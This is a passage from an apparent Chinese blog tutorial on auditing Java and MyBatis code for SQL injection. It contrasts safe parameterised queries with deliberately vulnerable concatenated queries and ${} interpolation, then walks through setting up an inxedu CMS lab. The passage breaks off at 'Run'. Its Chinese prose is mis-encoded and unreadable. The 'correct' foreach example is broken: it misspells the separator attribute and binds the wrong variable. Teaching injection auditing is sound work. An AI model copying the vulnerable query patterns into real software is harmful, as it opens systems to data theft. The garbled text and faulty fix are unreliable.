class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ­£ç¡®çš„ä½¿ç”¨PrepareStatementå¯ä»¥æœ‰æ•ˆé¿å…SQLæ³¨å…¥ï¼Œä½¿ç”¨ï¼Ÿä½œä¸ºå ä½ç¬¦ï¼Œè¿›è¡Œå‚æ•°åŒ–æŸ¥è¯¢</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹sqlè¯­å¥è¿›è¡Œèµ‹å€¼ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‚æ•°çš„ä½ç½®ï¼Œå³ç¬¬å‡ ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ ç»™è¯¥ä½ç½®çš„å€¼</span></span><br><span class="line">st.setString(<span class="number">1</span>, id);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br></pre></td></tr></table></figure></div><br/><p>3ã€å®‰å…¨ä»£ç  - ESAPIå®‰å…¨æ¡†æ¶</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ESAPI (OWASPä¼ä¸šå®‰å…¨åº”ç”¨ç¨‹åºæ¥å£)æ˜¯ä¸€ä¸ªå…è´¹ã€å¼€æºçš„ã€ç½‘é¡µåº”ç”¨ç¨‹åºå®‰å…¨æ§ä»¶åº“ï¼Œå®ƒä½¿ç¨‹åºå‘˜èƒ½å¤Ÿæ›´å®¹æ˜“å†™å‡ºæ›´ä½é£é™©çš„ç¨‹åº</span></span><br><span class="line"></span><br><span class="line">Codec&lt;Character&gt; oracleCodec = <span class="keyword">new</span> <span class="title class_">OracleCodec</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + ESAPI.encoder().encodeForSQL(oracleCodec, id) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);                    </span><br></pre></td></tr></table></figure></div><br/><h3 id="ä¸‰ã€æ¼æ´ç±»å‹"><a href="#ä¸‰ã€æ¼æ´ç±»å‹" class="headerlink" title="ä¸‰ã€æ¼æ´ç±»å‹"></a>ä¸‰ã€æ¼æ´ç±»å‹</h3><br/>POSTå‹æ³¨å…¥<div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from users where username = &#x27;&quot;<span class="operator">+</span>username<span class="operator">+</span>&quot;&#x27; and password = &#x27;&quot;<span class="operator">+</span>password<span class="operator">+</span>&quot;&#x27; &quot;;</span><br></pre></td></tr></table></figure></div><br/>Likeå‹æ³¨å…¥<div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String name <span class="operator">=</span> req.getParameter(&quot;name&quot;);</span><br><span class="line">           String <span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from users where name like &#x27;%&#x27;+name+&#x27;%&#x27;&quot;;</span><br></pre></td></tr></table></figure></div><br/>Headeræ³¨å…¥<div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String referer <span class="operator">=</span> req.getHeader(&quot;referer&quot;);</span><br><span class="line">String <span class="keyword">sql</span> <span class="operator">=</span> &quot;update user set referer =&#x27;&quot;<span class="operator">+</span>referer<span class="operator">+</span>&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure></div><br/><h3 id="å››ã€å°ç»“"><a href="#å››ã€å°ç»“" class="headerlink" title="å››ã€å°ç»“"></a>å››ã€å°ç»“</h3><p>ä»£ç å®¡è®¡æ—¶ï¼Œè‹¥å‘ç°å­˜åœ¨ä½¿ç”¨JDBCè¿æ¥æ•°æ®åº“å¯è¿›ä¸€æ­¥è·Ÿè¸ªå…¶ä»£ç ï¼Œåœ¨æ²¡æœ‰ä½¿ç”¨é¢„ç¼–è¯‘çš„æƒ…å†µä¸‹ä¸”æœªå®šä¹‰è¿‡æ»¤æ–¹æ³•ï¼Œåˆ™å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ã€‚</p><hr><h2 id="SQL-Injection-MyBatisæ¡†æ¶"><a href="#SQL-Injection-MyBatisæ¡†æ¶" class="headerlink" title="SQL Injection - MyBatisæ¡†æ¶"></a>SQL Injection - MyBatisæ¡†æ¶</h2><p>Mybatis æ˜¯ä¸€ä¸ªåŸºäº Java çš„æŒä¹…å±‚æ¡†æ¶ï¼Œå®ƒå†…éƒ¨å°è£…äº† jdbcï¼Œå¼€å‘è€…åªéœ€è¦å…³æ³¨ sql è¯­å¥æœ¬èº«ï¼Œä¸éœ€è¦èŠ±è´¹æ—¶é—´å’Œç²¾åŠ›å»å¤„ç†åŠ è½½é©±åŠ¨ã€åˆ›å»ºè¿æ¥ã€åˆ›å»º statement ç­‰ç¹æ‚çš„è¿‡ç¨‹ã€‚MyBatis æ¡†æ¶åº•å±‚å·²ç»å®ç°äº†å¯¹ SQL æ³¨å…¥çš„é˜²å¾¡ï¼Œä½†å­˜åœ¨ä½¿ç”¨ä¸å½“çš„æƒ…å†µä¸‹ï¼Œä»ç„¶å­˜åœ¨ SQL æ³¨å…¥çš„é£é™©ã€‚</p><br/><h3 id="ä¸€ã€Mybatisç‰¹æ€§"><a href="#ä¸€ã€Mybatisç‰¹æ€§" class="headerlink" title="ä¸€ã€Mybatisç‰¹æ€§"></a>ä¸€ã€Mybatisç‰¹æ€§</h3><p>Mybatis è·å–å€¼æœ‰ä¸¤ç§æ–¹æ³•ï¼Œ<code>$&#123;&#125;</code> å’Œ <code>#&#123;&#125;</code>ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ Mybatis ä½¿ç”¨ #{} è·å–å€¼ï¼Œå› ä¸ºèƒ½é¿å… SQL æ³¨å…¥æ¼æ´çš„äº§ç”Ÿï¼Œè‹¥ç›´æ¥ä½¿ç”¨ ${} è·å–å€¼åˆ™ä¸èƒ½æœ‰æ•ˆçš„é¿å…æ³¨å…¥ã€‚</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>#{} è§£æçš„æ˜¯å ä½ç¬¦é—®å·ï¼Œå¯ä»¥é˜²æ­¢SQLæ³¨å…¥ï¼Œä½¿ç”¨äº†é¢„ç¼–è¯‘ã€‚${} ç›´æ¥è·å–å€¼</pre></td></tr></tbody></table></figure><br/><h3 id="äºŒã€æ¼æ´ç±»å‹"><a href="#äºŒã€æ¼æ´ç±»å‹" class="headerlink" title="äºŒã€æ¼æ´ç±»å‹"></a>äºŒã€æ¼æ´ç±»å‹</h3><h5 id="1ã€likeæ³¨å…¥"><a href="#1ã€likeæ³¨å…¥" class="headerlink" title="1ã€likeæ³¨å…¥"></a><code>1ã€likeæ³¨å…¥</code></h5><p>ä»¥ä¸‹è¯­å¥åœ¨è¿è¡Œæ—¶ä¼šæŠ¥é”™</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">&#x27;%#&#123;title&#125;%&#x27;</span></span><br></pre></td></tr></table></figure></div><p>è¯¥è¯­å¥èƒ½æ­£å¸¸è¿è¡Œï¼Œä½†ç”±äºä½¿ç”¨äº†${}è·å–å€¼ï¼Œäº§ç”Ÿäº†SLQè¯­å¥æ‹¼æ¥ï¼Œå³ä½¿ä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œä½†è‹¥æ²¡æœ‰å¯¹è¯­å¥è¿›è¡Œè¿‡æ»¤ä¹Ÿä¼šäº§ç”ŸSQLæ³¨å…¥æ¼æ´</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%$&#123;name&#125;%&#x27;</span></span><br></pre></td></tr></table></figure></div><p>æ­£ç¡®è¯­å¥</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name <span class="keyword">like</span> #&#123;name&#125;</span><br></pre></td></tr></table></figure></div><br/><h5 id="2ã€inåçš„å‚æ•°æ³¨å…¥"><a href="#2ã€inåçš„å‚æ•°æ³¨å…¥" class="headerlink" title="2ã€inåçš„å‚æ•°æ³¨å…¥"></a><code>2ã€inåçš„å‚æ•°æ³¨å…¥</code></h5><p>ä»¥ä¸‹è¯­å¥åœ¨è¿è¡Œæ—¶ä¼šæŠ¥é”™</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="keyword">in</span> (#&#123;id&#125;)</span><br></pre></td></tr></table></figure></div><p>è¯¥è¯­å¥åˆ™èƒ½æ­£å¸¸è¿è¡Œï¼Œä½†ç”±äºä½¿ç”¨äº†${}è·å–å€¼ï¼Œäº§ç”Ÿäº†SLQè¯­å¥æ‹¼æ¥ï¼Œå³ä½¿ä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œä½†æ²¡æœ‰å¯¹è¯­å¥è¿›è¡Œè¿‡æ»¤åˆ™ä¹Ÿä¼šäº§ç”ŸSQLæ³¨å…¥æ¼æ´</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="keyword">in</span> ($&#123;id&#125;)</span><br></pre></td></tr></table></figure></div><p>æ­£ç¡®è¯­å¥ï¼Œä½¿ç”¨forrach</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>foreach collection<span class="operator">=</span>&quot;ids&quot; item<span class="operator">=</span>&quot;item&quot; <span class="keyword">open</span><span class="operator">=</span>&quot;(&quot;separatosr<span class="operator">=</span>&quot;,&quot; <span class="keyword">close</span><span class="operator">=</span>&quot;)&quot;<span class="operator">&gt;</span></span><br><span class="line">#&#123;ids&#125;</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>foreach<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div><br><h5 id="3ã€order-by-æ³¨å…¥"><a href="#3ã€order-by-æ³¨å…¥" class="headerlink" title="3ã€order by æ³¨å…¥"></a><code>3ã€order by æ³¨å…¥</code></h5><p>ä»¥ä¸‹è¯­å¥åœ¨è¿è¡Œæ—¶ä¼šæŠ¥é”™</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="operator">=</span><span class="string">&#x27;æ–°é—»&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> #&#123;<span class="type">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></div><p>è¯¥è¯­å¥åˆ™èƒ½æ­£å¸¸è¿è¡Œï¼Œä½†ç”±äºä½¿ç”¨äº†${}è·å–å€¼ï¼Œäº§ç”Ÿäº†SLQè¯­å¥æ‹¼æ¥ï¼Œå³ä½¿ä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œä½†æ²¡æœ‰å¯¹è¯­å¥è¿›è¡Œè¿‡æ»¤åˆ™ä¹Ÿä¼šäº§ç”ŸSQLæ³¨å…¥æ¼æ´</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="operator">=</span><span class="string">&#x27;æ–°é—»&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> $&#123;<span class="type">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></div><p>æ­£ç¡®è¯­å¥</p><div class="highlight-wrap" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="operator">=</span><span class="string">&#x27;æ–°é—»&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> #&#123;<span class="type">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure></div><br/><h3 id="ä¸‰ã€é¶åœºå­¦ä¹ "><a href="#ä¸‰ã€é¶åœºå­¦ä¹ " class="headerlink" title="ä¸‰ã€é¶åœºå­¦ä¹ "></a>ä¸‰ã€é¶åœºå­¦ä¹ </h3><h5 id="1ã€ç¯å¢ƒæ­å»º"><a href="#1ã€ç¯å¢ƒæ­å»º" class="headerlink" title="1ã€ç¯å¢ƒæ­å»º"></a><code>1ã€ç¯å¢ƒæ­å»º</code></h5><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] IDEA     2021.1</span><br><span class="line">[+] Mysql    5.7.26 </span><br><span class="line">[+] Tomcat   7</span><br><span class="line">[+] JDK      1.8_3_01 </span><br><span class="line">[+] CMS      inxedu_2.0.6</span><br></pre></td></tr></table></figure></div><br/><h5 id="2ã€IDEAæ­å»ºç½‘ç«™"><a href="#2ã€IDEAæ­å»ºç½‘ç«™" class="headerlink" title="2ã€IDEAæ­å»ºç½‘ç«™"></a><code>2ã€IDEAæ­å»ºç½‘ç«™</code></h5><p>â— IDEAé…ç½®Maven,ä¸‹è½½Mavenï¼Œç‰ˆæœ¬é€‰æ‹©å°½é‡ä¸è¦æœ€æ–°</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/maven/maven-3/</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915170827278.png" data-caption="image-20220915170827278"><img src="/../images/Java/sql/image-20220915170827278.png" alt="image-20220915170827278"></a></p><p>é…ç½®Mavenç¯å¢ƒå˜é‡ï¼Œcmdæ‰“å¼€ï¼šsysdm.cpl</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915171439247.png" data-caption="image-20220915171439247"><img src="/../images/Java/sql/image-20220915171439247.png" alt="image-20220915171439247"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915171322760.png" data-caption="image-20220915171322760"><img src="/../images/Java/sql/image-20220915171322760.png" alt="image-20220915171322760"></a></p><p>æµ‹è¯•æ˜¯å¦æˆåŠŸå®‰è£…</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn -v</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915171631902.png" data-caption="image-20220915171322760"><img src="/../images/Java/sql/image-20220915171631902.png" alt="image-20220915171322760"></a></p><p>é…ç½®é˜¿é‡Œé•œåƒå’Œjdkï¼Œåœ¨Mavenè§£å‹çš„åœ°æ–¹åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶å¤¹<code>responsitory</code>ï¼Œæ‰“å¼€Mavenæ–‡ä»¶å¤¹ä¸‹çš„confä¸­çš„settings.xmlçš„<code>&lt;settings&gt;</code>æ ‡ç­¾å†…æ·»åŠ ä»¥ä¸‹å†…å®¹</p><p>é…ç½®jdk1.8</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>é…ç½®é˜¿é‡Œé•œåƒæº</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>       </span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915154833152.png" data-caption="image-20220915154833152"><img src="/../images/Java/sql/image-20220915154833152.png" alt="image-20220915154833152"></a></p><p>å°†é…ç½®çš„Mavené€‚é…åˆ°IDEAï¼Œ<code>File -ã€‹ Settings -ã€‹ Build,Execution,Deployment -ã€‹ Maven</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220915172209445.png" data-caption="image-20220915172209445"><img src="/../images/Java/sql/image-20220915172209445.png" alt="image-20220915172209445"></a></p><p>â— IDEAé…ç½®JDK,<code>File -ã€‹ Project Structure -ã€‹ Project -ã€‹ Project SDK</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916103927914.png" data-caption="image-20220916103927914"><img src="/../images/Java/sql/image-20220916103927914.png" alt="image-20220916103927914"></a></p><p>â— IDEA æ·»åŠ  pom.xml æ–‡ä»¶ä¸º Maven æ–‡ä»¶,ç”±äºéƒ¨ç½²ç¯å¢ƒä¸ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€å…ˆä¿®æ”¹ pom.xml æ–‡ä»¶éƒ¨åˆ†å†…å®¹ï¼Œé¦–å…ˆå°†<code>&lt;systemPath&gt;</code>ä¸­çš„ basedir ä¿®æ”¹ä¸º pom.basedir ï¼Œå…±å››å¤„</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916221526099.png" data-caption="image-20220916221526099"><img src="/../images/Java/sql/image-20220916221526099.png" alt="image-20220916221526099"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916221711148.png" data-caption="image-20220916221711148"><img src="/../images/Java/sql/image-20220916221711148.png" alt="image-20220916221711148"></a></p><p>æ·»åŠ  plugin ç‰ˆæœ¬å·</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916221936799.png" data-caption="image-20220916221936799"><img src="/../images/Java/sql/image-20220916221936799.png" alt="image-20220916221936799"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916222014077.png" data-caption="image-20220916222014077"><img src="/../images/Java/sql/image-20220916222014077.png" alt="image-20220916222014077"></a></p><p>â— å¯¼å…¥æ•°æ®è‡³ <code>MYSQL</code> ,åˆ©ç”¨ <code>phpstudy</code> å¯¼å…¥ç¨‹åºæ•°æ®åº“ï¼Œæ³¨æ„ç”±äºæ•°æ®åº“æ–‡ä»¶ä¸­æœ‰æ•ˆæ—¶é—´å¡«å†™ä¸º <code>0000-00-00 00:00:00</code>ï¼Œä½† <code>timestamp</code> æœ‰æ•ˆæ—¶é—´åœ¨ï¼š<code>1970-01-01 00:00:00</code> åˆ° <code>2037-12-31 23:59:59</code>ï¼Œæ‰€ä»¥éœ€è¦å°†æ‰€æœ‰çš„ <code>0000-00-00 00:00:00</code> ä¿®æ”¹ä¸ºæœ‰æ•ˆæ—¶é—´å†…ï¼Œå¦åˆ™å¯¼å…¥æ–‡ä»¶ä¼šæŠ¥é”™ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916102933090.png" data-caption="image-20220916102933090"><img src="/../images/Java/sql/image-20220916102933090.png" alt="image-20220916102933090"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916103017494.png" data-caption="image-20220916103017494"><img src="/../images/Java/sql/image-20220916103017494.png" alt="image-20220916103017494"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220917103535006.png" data-caption="image-20220917103535006"><img src="/../images/Java/sql/image-20220917103535006.png" alt="image-20220917103535006"></a></p><p>æ³¨æ„æ•°æ®åº“åå¿…é¡»ä¸ <code>src/resources/project.properties</code> ç›¸åŒï¼Œå¦åˆ™ç½‘ç«™æ•°æ®ä¼šç¼ºå¤±ï¼ŒæŒ‰ç…§ä»¥ä¸‹æ“ä½œé¿å…å‡ºç°é”™è¯¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916230200246.png" data-caption="image-20220916230200246"><img src="/../images/Java/sql/image-20220916230200246.png" alt="image-20220916230200246"></a></p><p>å¯¼å…¥æ•°æ®</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916230305522.png" data-caption="image-20220916230305522"><img src="/../images/Java/sql/image-20220916230305522.png" alt="image-20220916230305522"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916230321871.png" data-caption="image-20220916230321871"><img src="/../images/Java/sql/image-20220916230321871.png" alt="image-20220916230321871"></a></p><p>â— é…ç½®inxedué¡¹ç›®ä¿¡æ¯<code>src/resources/project.properties</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233026648.png" data-caption="image-20220916233026648"><img src="/../images/Java/sql/image-20220916233026648.png" alt="image-20220916233026648"></a></p><p>â— é¡¹ç›®è¿è¡Œå‰ï¼Œé…ç½®ç›¸å…³ Maven ä¿¡æ¯,<code>File-ã€‹Project Settings -ã€‹Artifacts -ã€‹Web Applicationï¼šArchive -ã€‹Empty</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916223854118.png" data-caption="image-20220916223854118"><img src="/../images/Java/sql/image-20220916223854118.png" alt="image-20220916223854118"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224009296.png" data-caption="image-20220916224009296"><img src="/../images/Java/sql/image-20220916224009296.png" alt="image-20220916224009296"></a></p><p>â— é…ç½® <code>Run/Debug Configurations</code> ï¼Œé…ç½® <code>Tomcat</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916223455798.png" data-caption="image-20220916223455798"><img src="/../images/Java/sql/image-20220916223455798.png" alt="image-20220916223455798"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224207000.png" data-caption="image-20220916224207000"><img src="/../images/Java/sql/image-20220916224207000.png" alt="image-20220916224207000"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224309538.png" data-caption="image-20220916224309538"><img src="/../images/Java/sql/image-20220916224309538.png" alt="image-20220916224309538"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224349615.png" data-caption="image-20220916224349615"><img src="/../images/Java/sql/image-20220916224349615.png" alt="image-20220916224349615"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224407884.png" data-caption="image-20220916224407884"><img src="/../images/Java/sql/image-20220916224407884.png" alt="image-20220916224407884"></a></p><p>é…ç½®Maven</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224841069.png" data-caption="image-20220916224841069"><img src="/../images/Java/sql/image-20220916224841069.png" alt="image-20220916224841069"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916225058940.png" data-caption="image-20220916225058940"><img src="/../images/Java/sql/image-20220916225058940.png" alt="image-20220916225058940"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916231424395.png" data-caption="image-20220916231424395"><img src="/../images/Java/sql/image-20220916231424395.png" alt="image-20220916231424395"></a></p><p>æ³¨æ„ï¼Œè‹¥åœ¨è¿‡ç¨‹ä¸­å‡ºç°æŠ¥é”™ï¼Œä¿®æ”¹äº†ç›¸å…³é…ç½®ï¼Œè®°å¾— <code>clean &amp;&amp; install</code> æ¸…ç†ä¸€ä¸‹ç¼“å­˜ï¼Œå¦åˆ™ Run ä¼šå‡ºç°é”™è¯¯ï¼Œç½‘ç«™æ— æ³•èµ·æ¥ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233109842.png" data-caption="image-20220916233109842"><img src="/../images/Java/sql/image-20220916233109842.png" alt="image-20220916233109842"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916232156934.png" data-caption="image-20220916232156934"><img src="/../images/Java/sql/image-20220916232156934.png" alt="image-20220916232156934"></a></p><br/>â— ç¼–è¯‘è¿è¡Œ<p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224555430.png" data-caption="image-20220916224555430"><img src="/../images/Java/sql/image-20220916224555430.png" alt="image-20220916224555430"></a></p><p>ç¼–è¯‘æˆåŠŸ</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916224631034.png" data-caption="image-20220916224631034"><img src="/../images/Java/sql/image-20220916224631034.png" alt="image-20220916224631034"></a></p><br/>â— Run 